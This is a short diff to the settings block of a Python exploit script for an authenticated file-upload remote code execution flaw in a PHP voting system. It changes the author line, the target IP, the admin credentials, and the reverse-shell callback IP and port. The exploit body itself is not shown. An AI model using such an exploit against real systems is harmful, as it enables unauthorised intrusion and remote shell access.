@@ -1,6 +1,6 @@
 # Exploit Title: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
 # Date: 19/01/2021
-# Exploit Author: Richard Jones
+# Exploit Author: Richard Jones, Pentestical #small fix
 # Vendor Homepage:https://www.sourcecodester.com/php/12306/voting-system-using-php.html
 # Software Link: https://www.sourcecodester.com/download-code?nid=12306&title=Voting+System+using+PHP%2FMySQLi+with+Source+Code
 # Version: 1.0
@@ -9,11 +9,11 @@
 import requests
 
 # --- Edit your settings here ----
-IP = "10.10.10.239"                # Website's URL
-USERNAME = "admin"                 # Auth username
-PASSWORD = "administratorPassword" # Auth Password
-REV_IP = "10.10.16.20"             # Reverse shell IP
-REV_PORT = "4444"                  # Reverse port 
+IP = "10.10.10.239" # Website's URL
+USERNAME = "admin" #Auth username
+PASSWORD = "password" # Auth Password
+REV_IP = "10.10.12.20" # Reverse shell IP
+REV_PORT = "4445" # Reverse port 
 # --------------------------------
 
 INDEX_PAGE = f"http://{IP}/admin/index.php"
